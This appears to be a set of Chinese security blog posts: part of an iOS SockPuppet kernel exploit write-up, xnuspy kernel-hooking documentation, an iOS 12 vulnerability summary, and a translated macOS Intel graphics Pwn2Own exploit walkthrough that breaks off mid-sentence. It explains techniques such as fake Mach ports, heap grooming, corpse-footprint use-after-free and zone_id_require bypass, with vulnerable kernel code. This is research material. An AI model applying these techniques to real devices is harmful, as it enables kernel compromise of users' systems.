此时，我们有了tfp0。就像voucher_swap和其他漏洞一样，我们要使用这个临时的tfp0使用管道缓冲结构来引导一个更稳定的tfp0。我们通过使用内核任务端口来分配一页专门用于存储我们的数据的内核内存，然后使用写原语将我们的假任务端口和kernel_task写入那里。然后我们改变我们的IPC空间条目，使之指向这个新的ipc_port。 我们仍然有一个管道结构，它有一个指向释放的缓冲区的悬空指针。我们不想让它在关闭fd时double-free，所以我们使用新的稳定的tfp0来清空这个指针。我们基本上做了两个动作来破坏内存：释放那个指针，并使用新的使用后释放的管道缓冲区来覆盖单个ipc_port指针，所以跟踪清理是相当直接的。 评估PAC和MTE因为这个漏洞是基于内存损坏的bug，所以不同的缓解措施对它的影响是一个挥之不去的问题。通过A12芯片，苹果为iOS带来了PAC(指针认证)，这似乎是为了限制内核代码的执行，假设任意的内核读写等目标。这听起来是一个很强的缓解措施，如果没有实际经验，我不知道利用情况如何。我是在A9芯片上测试的，所以我只是希望我的利用中不会做任何会被PAC缓解的事情。事实果然如此。因为我的漏洞只针对数据结构，不涉及任意代码执行，所以没有代码指针可以伪造。 iOS 13开始引入了对一些数据指针的保护，所以值得研究一下我需要伪造哪些指针才能让这个漏洞在数据PAC的情况下发挥作用。PAC通过用私钥和指针本身在栈上的位置作为上下文值进行签名来保护栈上的返回地址不被破坏。但是，其他代码指针的签名是没有上下文值的。同样，数据PAC的有效性很可能取决于苹果选择如何使用上下文值。 让我们考虑一下这样的情况：所有的数据指针都是受保护的，但没有基于位置的上下文签名。在这种情况下，只要我们设法泄露它们，我们就可以将它们从一个位置复制到另一个位置。这就是比较有名的 “指针替换攻击”，Brandon在他关于PAC的博文中已经描述过。 我们的读原语在数据PAC的上下文中仍然有效，因为我们的悬空指针仍然是签名的。我们最终需要伪造或替换几个攻击者来源的指针：ipc_space_kernel、kernel_map、&amp;fake_port和&amp;fake_task，以及找到它们所需的所有中间读。回顾一下，&amp;fake_port和&amp;fake_task是指向管道缓冲区的指针。对于我们的初始入口点，pktoininfo指针是否受保护并不重要，因为我们必须通过OOL端口喷涂来泄露一个真正的ipc_port指针。这意味着我们可以收集一个签名的ipc_port，然后做所有我们已经做的前期数据结构遍历，复制PAC数据指针没有问题，ipc_space_kernel和kernel_map已经被签名了，如果管道缓冲区被签名了，我们可以简单地将假的端口和任务分割到两个管道缓冲区，然后获得每个缓冲区的签名指针。在任何情况下，这个漏洞都不会完全开箱即用，因为我们确实伪造了一个指针到文件描述符表中去查找任意的fd结构，而且有些查找可能需要读取超过20字节的数据。不过，我相信读取原语的功能足够强大，可以在不费吹灰之力的情况下解决这些漏洞。 实际上iOS 13只保护一些数据指针，矛盾的是这可能会提高终端用户的安全性。例如，如果管道缓冲区不受保护，如果端口的指针是有签名的，那么简单地泄露一个缓冲区的地址不太可能让我们用这个指针来表示一个假的ipc_port。对17B5068e的内核缓存进行检查后发现，IPC端口指针确实没有受到保护，但根据苹果今年早些时候的BlackHat演讲，我认为他们计划这样做（或者已经在非beta构建中这样做了）。就像任何缓解措施与提供强大初始原语的bug相结合一样，这只是一个设计替代利用技术的问题。在不考虑哪些指针应该被保护或不保护的捶胸顿足的情况下，我希望在未来，尽可能多的指针都以位置作为上下文进行签名，以帮助缓解指针替换攻击的影响。从我们的思想实验中可以看出，如果数据指针只是简单地以上下文为0进行签名，那么，一个好的基于use-after-free的读取原语并没有什么好处。 另一个需要考虑的缓解措施是ARM的内存标签扩展（MTE），我相信苹果会尝试实现这个即将到来的CPU功能。对于这个缓解措施，这里和这里有一个很好的高层总结。实质上，内存分配器将为内存分配分配分配一个随机的标签，这个标签将成为指针上部未使用位的一部分，就像在PAC中一样。正确的标签值将被存储在行外，类似于ASAN如何将堆元数据存储在行外。当处理器去解除对指针的引用时，它会检查标签是否匹配。这个漏洞本来是可以被MTE缓解的，因为我们在漏洞中多次触发释放后的使用，每次访问释放的指针时，它的标签都会与释放范围的新标签或哪个分配回收缓冲区的标签进行比较。根据CPU或内核的配置，当一个不匹配的标签被识别出来时，会影响到如何进行利用。我希望苹果公司在标签检查失败时配置一个同步或异步异常，考虑到他们根据他们对PAC的LLVM文档，努力触发PAC违规的数据中止。”虽然ARMv8.3的aut*指令本身并不会在失败时触发异常，但编译器只会在会触发异常的序列中发出这些指令。” iOS Exploit Meta Summary Benefit Used? IOSurface subsystem Spray arbitrary data of controlled contents and size in kernel address space Yes OOL port descriptor array Spray arbitrary multiple of 8 array containing pointers to ipc_ports with send right Yes Pipe buffers Repeatable read/write from userland of malloced buffer without needing sprays Yes Looking around the host port for other early ports Find the kernel task port Yes, SockPuppetV1, replaced with my own variant later Copying kernel_task task port to a new address Bypass kernel_task task port check for messages coming from a user task Yes Creating a fake task port pointing to an arbitrary “task” and reading its PID Repeatable arbitrary read No, already had arbitrary read directly via first stage Triggering zone allocator garbage collection Reclaim an object from one zone with an object from another No, all relevant objects were already in the generic size-based zones","link":"/2022/04/05/iOS-SockPuppet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"title":"iOS内核函数Hook框架 - xnuspy","text":"前言xnuspy 是一个 pongoOS 模块，它安装了一个新的系统调用xnuspy_ctl，允许从用户空间Hook内核函数。 适用范围：在 checkra1n 0.12.2 及更高版本上支持 iOS 13.x、iOS 14.x 和 iOS 15.x，不支持TV 4K 设备。 前置条件brew install libusb 编译make即可 一些编译可能有用的选项： XNUSPY_DEBUG=1 #将 xnuspy 的调试输出发送到内核日志(kprintf) 123- ```bash XNUSPY_SERIAL=1 #将调试输出从 xnuspy 发送到IOLog XNUSPY_LEAKED_PAGE_LIMIT=n #设置 xnuspy 在其垃圾收集线程开始释放它们之前允许泄漏的页数。默认为64。更多信息可以在[Debugging Kernel Panics下找到 123- ```bash XNUSPY_TRAMP_PAGES=n #设置 xnuspy 为其蹦床结构保留的页数。默认值为 1。更多信息可以在limits下找到 XNUSPY_DEBUG并且XNUSPY_SERIAL不相互依赖。 用法使用checkra1n将设备引导至 pongo shell： 1/Applications/checkra1n.app/Contents/MacOS/checkra1n -p 在xnuspy目录下执行 1loader/loader module/xnuspy 几秒钟后你的设备就会启动。 xnuspy_ctlxnuspy 将修补一个 enosys 系统调用，以指向 xnuspy_ctl_tramp。这是一个小的跳板，它将编译后的 xnuspy_ctl 代码标记为可执行代码，并将分支指向它。你可以在module/el1/xnuspy_ctl/xnuspy_ctl.c中找到xnuspy_ctl的实现，在example目录中找到例子。 include/xnuspy/里面是xnuspy_ctl.h，这个头文件定义了xnuspy_ctl的常量。它被包含在所有Hook内核函数的程序中。 你可以使用 sysctlbyname 来了解哪个系统调用被修补了。 123size_t oldlen = sizeof(long);long SYS_xnuspy_ctl = 0;sysctlbyname(&quot;kern.xnuspy_ctl_callnum&quot;, &amp;SYS_xnuspy_ctl, &amp;oldlen, NULL, 0); 这个系统调用需要四个参数，flavor、arg1、arg2和arg3，arg1、arg2和arg3的含义取决于flavor。flavor可以是 XNUSPY_CHECK_IF_PATCHED 检查 xnuspy_ctl 是否存在，返回999，其他参数的值被忽略。 XNUSPY_INSTALL_HOOK 匹配MSHookFunction的API。 arg1是想钩住的内核函数的UNSLID地址。arg2是一个指向ABI兼容的替换函数的指针。 arg3是一个指针，用于xnuspy_ctl复制出代表原始内核函数的蹦床的地址。如果不打算调用原始函数，这个指针可以是NULL。 XNUSPY_REGISTER_DEATH_CALLBACK 注册一个可选的 “死亡回调”，当钩子程序退出时，xnuspy会调用这个函数，清理在内核钩子上创建的任何东西。如果创建了内核线程，可以在这个函数中终止它们。 回调不是异步调用的，所以如果主线程阻塞，就会阻止xnuspy的垃圾回收线程执行。 arg1是一个指向回调函数的指针。其他参数的值被忽略。 XNUSPY_CALL_HOOKME hookme是一个小的汇编存根，xnuspy通过xnuspy缓存导出以提供Hook。用这种方式调用 xnuspy_ctl 会导致 hookme 被调用，提供了一种方法来轻松获得内核代码的执行，而不用去钩住一个实际的内核函数。 arg1是一个参数，当它被调用时将被传递给hookme。这个参数可以是NULL。 XNUSPY_CACHE_READ 从 xnuspy 缓存中读取的方法。它包含了许多有用的东西，如kprintf、current_proc、kernel_thread_start、一些libc函数和内核滑动。关于缓存ID的完整列表，请查看example/xnuspy_ctl.h。 arg1是xnuspy_ctl.h中定义的缓存ID之一，arg2是一个指针，用于xnuspy_ctl复制出请求的地址或值。其他参数的值被忽略。 XNUSPY_KREAD 在没有tfp0的情况下从用户空间读取内核内存。 arg1是一个内核虚拟地址，arg2是用户空间缓冲区的地址，arg3是该用户空间缓冲区的大小。 XNUSPY_KWRITE 从用户空间写到内核内存，而不用tfp0。 arg1是一个内核虚拟地址，arg2是一个用户空间缓冲区的地址，arg3是该用户空间缓冲区的大小。 XNUSPY_GET_CURRENT_THREAD 为用户空间提供了调用线程的内核地址。 arg1是一个指针，用于xnuspy_ctl复制出current_thread的返回值。其他参数的值被忽略。","link":"/2021/12/11/iOS%E5%86%85%E6%A0%B8%E5%87%BD%E6%95%B0Hook%E6%A1%86%E6%9E%B6-xnuspy/"},{"title":"iOS漏洞总结","text":"前言本文主要想做两方面的工作： 汇总自 iOS12.0 以来的所有漏洞，不涉及具体的漏洞分析； 整理 iOS 发展过程中引进的漏洞缓解措施，及其绕过方式。 缓解措施PACARMv8.3-A 引入的安全功能之一是指针身份验证，该功能使用指针的高位来存储指针身份验证代码 (PAC)，它本质上是指针值的加密签名和一些额外的上下文。引入了特殊指令以向指针添加验证码并验证经过验证的指针的 PAC 并恢复原始指针值。 iOS 12.x12.0 - 12.1.2voucher_swap (CVE-2019-6225)漏洞原理顾名思义，漏洞出现在task_swap_mach_voucher()函数(osfmk/kern/task.c)中，作用是用新的voucher替换旧的voucher： 1234567891011121314/* Placeholders for the task set/get voucher interfaces */......kern_return_ttask_swap_mach_voucher( task_t task, ipc_voucher_t new_voucher, ipc_voucher_t *in_out_old_voucher){ if (TASK_NULL == task) return KERN_INVALID_TASK; *in_out_old_voucher = new_voucher; return KERN_SUCCESS;} 漏洞触发是在 MIG 生成的代码中： 123/* Routine task_swap_mach_voucher */mig_internal novalue _Xtask_swap_mach_voucher (mach_msg_header_t *InHeadP, mach_msg_header_t *OutHeadP) 在_Xtask_swap_mach_voucher()里，将调用task_swap_mach_voucher()，从而导致引用计数的变化： new_voucher的引用计数+1 =&gt; convert_port_to_voucher() old_voucher的引用计数+1 =&gt; convert_port_to_voucher() old_voucher = new_voucher =&gt; task_swap_mach_voucher() new_voucher的引用计数-1 =&gt; ipc_voucher_release() new_voucher的引用计数-1 (old_voucher = new_voucher) =&gt; convert_voucher_to_port 漏洞利用 分配大量voucher并释放它们； 通过漏洞，将new_voucher的引用计数减为0，形成悬空指针； 将该指针填充为假的voucher。 堆风水OOL端口描述符MACH_MSG_OOL_PORTS_DESCRIPTOR。 12.0 - 12.2/12.4SockPuppet (CVE-2019-8605)漏洞原理问题出现在对ip6_freepcbopts的调用上，开发者的本意是：在某些情况下，通过释放每个指针后将其置为NULL来重用socket选项。但由于in6p_outputopts是由一个指向另一个结构的指针来表示的，所以它们是由辅助函数 ip6_freepcbopts释放的，该函数不知道inp的地址，从而不能清除&amp;inp-&gt;in6p_outputopts，这段代码忽略了这一点，造成了悬空指针。 释放的缓冲区是由setsockopt创建的，意味着我们可以通过getsockopt和setsockopt来继续访问释放的缓冲区，分别代表着读取和写入原语。 123456789101112131415161718192021voidin6_pcbdetach(struct inpcb *inp){ // ... if (!(so-&gt;so_flags &amp; SOF_PCBCLEARING)) { struct ip_moptions *imo; struct ip6_moptions *im6o; inp-&gt;inp_vflag = 0; if (inp-&gt;in6p_options != NULL) { m_freem(inp-&gt;in6p_options); inp-&gt;in6p_options = NULL; // &lt;- good } ip6_freepcbopts(inp-&gt;in6p_outputopts); // &lt;- bad, dangling pointer ROUTE_RELEASE(&amp;inp-&gt;in6p_route); // free IPv4 related resources in case of mapped addr if (inp-&gt;inp_options != NULL) { (void) m_free(inp-&gt;inp_options); inp-&gt;inp_options = NULL; // &lt;- good }// ... 漏洞利用堆风水OOL端口描述符MACH_MSG_OOL_PORTS_DESCRIPTOR。 12.4.1AppleAVE2Driver exploit (CVE-2019-8795)AppleSPUProfileDriver information leak (CVE-2019-8794)12.4.2 - 12.5.3oob_timestamp (CVE-2020-3837)cuck00 information leak (CVE-2020-3836)12.3 - 12.5.3checkm8 (CVE-2019-8900)硬件漏洞，暂不深究。 堆风水OOL端口描述符MACH_MSG_OOL_PORTS_DESCRIPTOR。 IOSurface","link":"/2022/05/02/iOS%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"},{"title":"macOS Intel图形内核拓展RCE+EOP","text":"前言最近RET2放出了Pwn2Own 2021上的不少好东西，先是Parallels Desktop的一个沙箱逃逸，然后就是这个macOS的RCE+EOP，都给了完整的利用代码，这不看一下实在是说不过去。 先上一下原文链接：https://blog.ret2.io/2022/06/29/pwn2own-2021-safari-sandbox-intel-graphics-exploit/。 文章说“与英特尔图形相关的 CVE 在 Apple 的安全更新列表中变得越来越普遍”，依据之前看的Apple每月的安全更新来说，确实是这样，看来不管是什么系统，驱动都是很容易出问题的。 IOKit 图形加速概述与漏洞有关的两个内核驱动程序是： IOAcceleratorFamily2：通用平台无关代码和类，例如IOAccelContext2 AppleIntel*Graphics：特定于硬件的代码和子类，例如IGAccelGLContext 加载的特定于硬件的内核拓展依赖于CPU代数： AppleIntelICLGraphics 用于最新的 Ice Lake 硬件 AppleIntelKBLGraphics 用于 Kaby Lake/Coffee Lake AppleIntelSKLGraphics 用于 Skylake ……更老的东西 这些驱动程序通过IOKIT向用户空间开放功能，一般来讲，驱动程序实现了3个部分： 服务 用户客户端 外部方法 想要与驱动通信的用户空间程序需要先获得这个服务的一个端口，驱动程序随后通过一个数字ID标识一个特定的用户客户端，然后就可以通过用户客户端调用外部方法，通过数字ID选择方法，根据需要传入标量和或二进制blob参数，外部方法可以认为是对内核驱动的RPC调用。 与用户客户端交互的另一种常见方式是通过共享内存（在用户空间和内核之间）。 IntelAccelerator/IOAccelerator在基于Intel的Mac上，图形加速服务的名称为IntelAccelerator，或者是IOAccelerator，渲染器/WebContent沙盒明确允许打开这个服务，尽管有一些代码用于限制允许的用户客户端和外部方法。虽然Safari有一个单独的GPU进程，但IOAccelerator可以被WebContent沙盒配置文件所允许（截至编写时）。 为了了解IOAccelerator的可用攻击面，需要通过逆向工程来列举该服务的用户客户端，寻找一个重载的newUserClient函数。这个函数将在用户空间调用IOServiceOpen时被调用。 AppleIntelICLGraphics没有实现IntelAccelerator::newUserClient，所以要看一下IOAcceleratorFamily2中实现的超类。在那里找到了 IOGraphicsAccelerator2::newUserClient，它包含了对输入ID的切换案例，给了一个可以创建的用户客户端的集合（每个都实现为一个C++类）。 可以为感兴趣的每个用户客户端寻找外部方法。查找每个类重写的以下函数之一： externalMethod getTargetAndMethodForIndex getAsyncTargetAndMethodForIndex 这些函数中的每一个都会接受一个数字选择器来识别外部方法，并且会直接调用实现，或者返回一个包含相关信息的结构（例如，一个函数指针和参数类型/数量）。最终调用这些内核函数的相应的用户空间API是IOConnectCallMethod系列函数。 还有一些陷阱函数，可以使用IOConnectTrap函数之一来调用。其各自被重写的内核函数是getTargetAndTrapForIndex和getExternalTrapForIndex。 一些用户客户端还提供了将共享内存映射到用户空间的IOConnectMapMemory。这些用户客户端覆盖了clientMemoryForType的内核函数。 Inspecting a User Client以IntelAccelerator服务的类型为6的用户客户端 IGAccelSharedUserClient（继承自 IOAccelSharedUserClient2）为例，查看外部方法： 12345IOExternalMethod* IOAccelSharedUserClient2::getTargetAndMethodForIndex(..., unsigned int index) { if ( index &lt; 20 ) return &amp;IOAccelSharedUserClient2::sSharedMethods[index]; return 0;} 可以看到在data区有一个外部方法的静态数组，这是常见的模式。 IGAccelSharedUserClient是一个用于排序以及创建多种供其他用户客户端使用的对象的一个帮助程序，一些外部方法如 new_resource， create_shmem， allocate_fence_memory 和 set_resource_purgeable。 创建的对象的 “命名空间 “可以通过用IOConnectAddClient连接另一个用户客户端以进行共享。 Resources (也叫textures)，是由 IGAccelResource类表示的，这个类对利用来讲很有用，外部方法 new_resource创建一个用户指定属性的resources ，并将资源ID返回到用户空间，它还会将资源的后备缓冲区（用户指定大小）备份映射到进程地址空间中。 Sideband Buffers有一些继承自 IOAccelContext2的用户客户端，这些content对象提供了一些类型的共享内存，类型0就是Sideband Buffers。 Sideband Buffers可以通过外部方法2 （IOAccelContext2::submit_data_buffers）进行提交，这最终在IOAccelContext2::processSidebandBuffer中结束，它根据一个简单的二进制格式处理Sideband Buffers中的 “token”。 token_id，两个字节，一种操作码，将决定Token Body要如何处理； token_size，两个字节，dowrd表示的Token大小，即，一个有空body的token的大小为2. db0_off，表示进入 “数据缓冲区0 “的一个偏移。在这种情况下，数据缓冲区是一种特殊的资源类型（IGAccelResource）。一个操作码为0的令牌可以用来 “绑定 “数据缓冲区0；令牌body将包含需要绑定的资源ID。 当迭代Sideband Buffers令牌时，一个辅助结构IOAccelCommandStreamInfo将包含描述命令流和当前令牌状态的某些字段。这为各种令牌处理程序访问公共字段提供了方便。字段db0_ptr，存储了一个进入数据缓冲区0的指针，在db0_off偏移。 函数processSidebandBuffer执行一些基本的边界检查，以确保db0_off和token_size不会太大，然后将token的处理推迟到一个虚拟方法processSidebandToken。 对于大多数的上下文对象来说，各种重载的实现都遵循类似的模式。如果上下文应该处理操作码，它就会传递给该操作码的令牌处理程序，否则它就推迟到超类的 processSidebandToken 函数。所有的令牌处理程序似乎都被统一命名为process_token_*，所以它们相对容易被列举出来。 Out-Of-Bounds Write in VPHAL Handler其中一个IOAccelContext2子类用户客户端：IGAccelVideoContextMain，有一个处理 VPHAL 令牌的程序： 123456789101112131415161718192021222324252627282930void IGAccelVideoContextMain::process_token_VPHAL( IGAccelVideoContextMain *this, IOAccelCommandStreamInfo *info){ unsigned int* cur = info-&gt;sb_cur; // current token IGAccelVideoContextMain::patch_vphal_command_buffer(this, info, cur+5);}void IGAccelVideoContextMain::patch_vphal_command_buffer( IGAccelVideoContextMain *this, IOAccelCommandStreamInfo *info, unsigned int *sb){ // offset pointer into data buffer 0 unsigned int* db0 = info-&gt;db0_ptr; // take a resource id from sb, get its &quot;gpu address&quot; unsigned long gpu_addr; this-&gt;bind_resource(this, info, *sb&gt;&gt;16, &amp;gpu_addr, ...); // get index from sb unsigned long idx = (*sb&gt;&gt;3)&amp;0x7f; // bounds check the index against dbuf0 base/length if (&amp;db0[idx+1] &lt;= info-&gt;dbuf0_base + info-&gt;dbuf0_size) { // &lt;--- [1] // write low/high 32 bits db0[idx] = gpu_addr; db0[idx+1] = gpu_addr&gt;&gt;32; // &lt;--- [2] }} [1]处的边界检查是off-by-one。它确保db0[idx]在数据缓冲区0的范围内，然而在[2]处对db0[idx+1]的写入可能是越界的。这就给了我们一个对资源缓冲区后的4个字节的out-of-bounds写原语。 虽然我们只能猜测，但这个bug可能是在GPU地址变成64位而不是32位时引入的，而边界检查并没有更新以匹配。 资源可以用一个父资源和一个64位的偏移量来创建，这将子资源的GPU地址设置为父资源的地址加上偏移量。我们可以通过驱动程序的预期功能发现父资源的GPU地址，这样我们就可以知道偏移的数值。这样我们就可以完全控制写入界外的4个字节。 Resource Buffer Allocation我们的下一个任务是找到一个可以直接放在资源缓冲区后面的破坏目标，它的前4个字节对破坏是 “有用 “的。这将有助于了解资源缓冲区在内核内存中的分配方式和位置，以便我们能够可靠地控制在它周围分配的内容。 从Mach内核的角度来看，虚拟内存是通过vm_map对象的层次结构管理的。顶级地图，kernel_map，包含了整个内核的虚拟内存范围。子地图是在父地图（通常是kernel_map）中保留一个较小的虚拟地址范围。更多的信息可以*OS Internals中找到。 这样看，是不是还是应该啃一下*OS Internals这本书呢？ 一个资源缓冲区被实现为一个IOBufferMemoryDescriptor，除此之外，还设置了kIOMemoryPageable选项。可分页内存描述符的后备缓冲区来自一组特殊的可分页IOKit分配的子地图，由全局结构gIOKitPageableSpace管理。这个空间最多允许8个地图，每个512MB。 在可分页空间分配的主要入口是IOIteratePageableMaps。这个算法非常简单：从有索引提示的子地图（上次成功分配的地图）开始，向后迭代，直到有地图能够为分配提供服务。如果没有足够的空间，就创建一个全新的512MB子地图。 Ensuring Reliable Allocation Placement可分页空间似乎主要用于类似二进制blob的数据，所以我们选择在可分页空间之外的地方作为目标，即把资源缓冲区放在子地图的最末端，而把受害者对象紧随其后。 策略如下： 用512MB的资源强制分配一个全新的512MB的子表； 在正常使用的情况下，系统极不可能在kernel_map中存在一个512MB的空洞，这就有效地保证了我们的资源将被放置在虚拟内存的末端。 将数据缓冲区0放置在新地图的末端 释放512MB的资源 分配一个填充资源来填充地图的开始，大小为512MB - &lt;dbuf0的大小&gt;。 分配 dbuf0 分配受害者对象，为了保证可靠性，受害者对象应该足够大，可以放在虚拟内存的末端（即kernel_map中没有足够大的洞来容纳受害者对象）。 现在需要找到一个 “大 “的受害者对象。 Identifying Viable Corruption Targets / Victim Objects内核中有几个常见的内存分配函数，例如kernel_memory_allocate和kalloc。kalloc是内核代码中动态分配内存的最常见方法。 对于kalloc来说，0x4000或更小的分配是由zone分配器处理的。0x80000（512KB）或更小的内存会被分配到kalloc_map，一个特殊的子map。更大的则直接从kernel_map分配。如果我们需要，我们可以完全填满kalloc_map，这样进一步的分配就会回到kernel_map。这意味着，如果我们要寻找通过kalloc分配的候选受害对象，我们应该寻找至少能达到0x4001字节的分配。 Binary Ninja分析在这里相当有帮助，允许我们用脚本搜索任何对各种分配函数的调用，参数可能足够大。(分析将需要相当长的时间，你可能需要强制分析一些函数以使脚本工作，和/或添加__noreturn以使其恐慌) 12345678910111213141516171819202122232425262728293031323334353637# if xref'ing kalloc, the internal kalloc function has no symbol name# need to get the address manually (tailcalled from kalloc_external)xrefs = bv.get_callers(0xffffff800028c8d0)minsize = 0x4001sites = []sizes = []for ref in xrefs: print(repr(ref)) mlil = ref.function.get_low_level_il_at(ref.address).mlil if mlil.operation not in (MLIL_CALL, MLIL_TAILCALL): raise Exception(&quot;bad mlil&quot;) size = mlil.operands[2][1] # change second index depending on which arg is size print(&quot;size: &quot;+repr(size)) vals = size.possible_values if vals.type in (RegisterValueType.ConstantPointerValue, RegisterValueType.ConstantValue)\\ and vals.value &lt; minsize: continue elif vals.type in (RegisterValueType.UnsignedRangeValue, RegisterValueType.SignedRangeValue): maxx = max(r.end for r in vals.ranges) if maxx &lt; minsize: continue elif vals.type == RegisterValueType.InSetOfValues: if all(v &lt; minsize for v in vals.values): continue sites.append(ref) sizes.append(vals)print(&quot;\\n\\n&quot;+&quot;=&quot;*34+&quot;\\n&quot;)for i in range(len(sites)): print(&quot;0x%016x %-48s %r&quot;%(sites[i].address, sites[i].function.symbol.full_name, sizes[i])) Corpse Footprints我们的漏洞所针对的受害者结构涉及corpse。在XNU中，corpse是一个分叉的、死亡的任务版本，通常在某些异常情况下产生。也可以通过调用task_generate_corpse直接生成一个，它返回一个代表corpse的mach端口。 注意：在Pwn2Own 2021之后，苹果更新了WebContent沙盒，以阻止这个接口。 在创建一个corpse时，会以不同大小的二进制格式收集其内存足迹的一种快照。它在vm_map_corpse_footprint_collect中直接从kernel_map和kernel_memory_allocate中分配。其大小取决于任务的虚拟内存大小，最大为8MB。 该大小被存储在分配的第一个字段中，即cf_size： 1234struct vm_map_corpse_footprint_header { vm_size_t cf_size; /* allocated buffer size */ // ...}; 而在vm_map_corpse_footprint_destroy中销毁corpse时，cf_size被传递给vm_deallocate。 通过破坏cf_size，我们可以人为地扩大Footprint，使其与相邻的受害者分配重叠，然后这些分配将与Footprint一起被释放。 破坏前： 破坏后，Footprint覆盖了受害者： 这允许我们诱导受害者对象的UAF，尽管为了可靠起见，我们还是应该坚持使用足够大的分配。这种UAF技术有一个注意事项，即受害者对象必须是可分页内存，而不是 wired内存。 Wired Kernel Allocations绝大多数的内核分配是wired的。当用vm_map_remove删除这些映射时，一个标志VM_MAP_REMOVE_KUNWIRE表明虚拟内存条目的wired计数（一种refcount）应该被减去。无论哪种方式，在实际删除该条目之前，它都会等待wired计数为零。 corpse footprint是罕见的可分页分配对象之一，因此在释放时，unwire标志将不会被使用。如果重叠的受害者分配是wired的，内核线程就会挂起，等待一个不会发生的unwire。在实际应用中，这意味着我们只能对一个可分页的受害者分配进行UAF。 方便的是，我们已经遇到了一个潜在的有用的可分页分配。IOKit可分页空间。在这个阶段的计划变成了： 分配一个新的可分页map，结尾有一个数据缓冲区； 分配corpse footprint； 在footprint之后分配一个新的可分页map； 在新的map中分配第二个数据缓冲区； 触发bug，扩大footprint； 销毁corpse，释放footprint和新的map； 第二个数据缓冲区现在指向已释放的内存。 使用VPHAL标记（但这次是用in-bounds偏移），我们可以很容易地将任意的64位值写入释放的数据缓冲区。然而，为了保证可靠性，最好是尝试用足够大的对象来回收释放的数据缓冲区内存。 Initial Kernel Information Leaks在这一点上，我们已经把4个字节的越界写入变成了任意破坏任何大型分配内容的能力。为了获得一些信息泄露，我们将滥用mach信息体，它的分配大小上限大约为64MB。 一些相关的背景：Mach消息体有一个头，后面是消息的其余部分。消息可以是 “简单的 “或 “复杂的”，由头字段中的一个比特msgh_bits表示。一个简单的消息是简单的原始字节。一个复杂的消息可以包含几个描述符，它们可以用来向消息接收者发送端口权限和/或内存映射。在这两种情况下，报头字段msgh_size表示整个消息体的缓冲区大小。 Mach消息在内核中由ipc_kmsg结构表示，其中包含一个字段ikm_header，指向从用户空间复制和转换过来的消息体。这个消息体将是我们的破坏目标。 mach_port_peek允许 “偷看 “一个端口接收队列中的第一条消息。其中一个被偷看的值是消息的trailer，通常由mach内核附加到消息体上。trailer通常位于ikm_header + ikm_header-&gt;msgh_size，但通过破坏msgh_size，我们可以将trailer移到界外，以获得out-of-bound读。 注意：mach_port_peek也不再被WebContent沙箱所允许。 破坏前： 破坏后： 我们在两个不同的泄漏目标上使用这种技术： 第一个是包含端口描述符的mach信息体。 当从用户空间转换时，端口描述符中的数字mach端口被一个指向相应ipc_port对象的指针所取代。我们需要泄露两个紧邻的ipc_port对象。其原因将在下一节解释。 第二个泄漏目标将是一个包含单个OSData对象的OSArray的内容。 泄露OSData对象的地址将给我们提供一个位置，以便以后获得text泄露（OSData的第一个字段是vtable）。 在过去（1，2），使用OSObject进行内核开发已经做过很多次了。通过将OSObject附加到IOSurface的属性名上，它们可以方便地被分配/释放（这是我们在WebContent沙盒中允许做的）。这些对象在内核中从类似XML的文本格式或二进制格式被反序列化。 二进制格式（由OSUnserializeBinary反序列化）允许对分配的大小进行更多的控制；例如，我们可以分配一个有65536个元素容量的OSArray，然后在其中放置一个OSData，其余部分为空。 Circumventing zone_id_require with a Misaligned Port破坏OSArray的内容，使其包含一个假的OSObject指针，这将是相对简单的。由于这些是C++类，我们会立即通过一个假的vtable劫持控制流。然而，我们至少需要一个text泄漏（内核代码地址），以便有地方可以跳转到。我们还需要知道首先将假的OSObject指向哪里（然后它将包含假的vtable等）；或者换句话说，我们控制的数据的地址。 为了获得这些泄漏，我们需要对mach端口进行一些创意。我们要制作一个假的端口，目的是为了获得一个半任意的读取。创建一个假端口的最大挑战是绕过各种zone_require/zone_id_require调用。这个Project Zero的帖子很好地解释了这一点。 zone_require是iOS 13中引入的一个软件缓解措施，增加了对某些从预期的zalloc区域分配的指针，在使用前进行检查。iOS内核缓存中最常见的zone_require检查是对Mach端口的检查；例如，每次ipc_port被锁定时，zone_require()函数被调用，以检查包含Mach端口的分配是否位于ipc.ports区域（而不是，例如，用kalloc()分配的OSData缓冲区）。 为了解决这个问题，我们可以利用zone_require不关心正确的对齐方式，只关心指针位于适当的区域内。我们将使用我们先前泄露的两个相邻的端口，并在这两个端口之间制作一个错位的假 ipc_port。 为了把这个假端口引入我们的ipc空间，我们将再次破坏一个mach消息体。我们不破坏消息体的msgh_size，而是进行几次写操作，把它变成一个复杂的消息体，包含一个端口描述符，有一个发送到我们假端口的权利。如果我们能在收到这个消息后存活下来，一个新的发送到假端口的发送权将被添加到我们的ipc空间。 另一个附带说明：我们不确定是否有可能将这种技术应用于非x86平台，因为有一些签名验证代码在x86平台上基本上是被忽略的。在复制一个mach消息后，内核用ikm_sign计算出消息体和所有描述符的签名。当复制出消息时，它重新计算签名并检查是否匹配，否则就会panic。 理论上，当内核在计算签名之前还在复制描述符的时候，应该有可能进行消息体的破坏。如果有可能通过强迫内核花很长的时间来复制所有的描述符来使竞赛变得可靠，或者以某种方式检查竞赛是否失败，并解除对消息的破坏和重试，这种技术就有可能发挥作用。 当接收消息时，端口描述符在ipc_kmsg_copyout_port_descriptor中被处理，尽管大部分的逻辑是在ipc_object_copyout中进一步处理。仔细追踪假的ipc对象是如何被处理/检查的，这给了我们一些约束，即假端口的一些字段应该如何看才能存活。 io_bits：偏移量为0的int大小的位域 高位必须被设置，表示端口处于活动状态 [1] 。 剩余的高位15位表示对象类型，必须是1以外的任何值（IOT_PORT_SET）。这个值决定了ipc_object_validate需要哪个区，我们希望它是端口区 [2] 。 掩码为0x400的位必须为0，以表示kobject没有标签(这将触发一些我们宁愿避免的额外检查) [3] io_lock_data。8字节的值，位于偏移量8。必须为0，表示没有锁，否则在试图锁定端口时，会发生死锁/恐慌 [4] 这些是安全接收发送权到假端口的唯一要求。在偏移量0处有一些半控制位，而在偏移量8处有一个零。 对于我们之前泄露的相邻的端口，将第一个端口称为A，第二个称为B。 io_bits 与 A-&gt;seqno 重叠，是一个序列号。这个值通常在每次向端口发送消息时被递增，但它也可以通过mach_port_set_seqno手动设置（这个调用不再被沙盒允许）。因此，它是一个完全可控的 32 位值，允许我们满足 io_bits 上的约束。 io_lock_data与端口A的qcontext、qlimit和msgcount重叠。qcontext通常为0。msgcount是当前在接收队列上的消息数量，如果没有，则为0。qlimit是在接收队列上可以放置多少消息的上限。它的默认值是 5，但是可以用 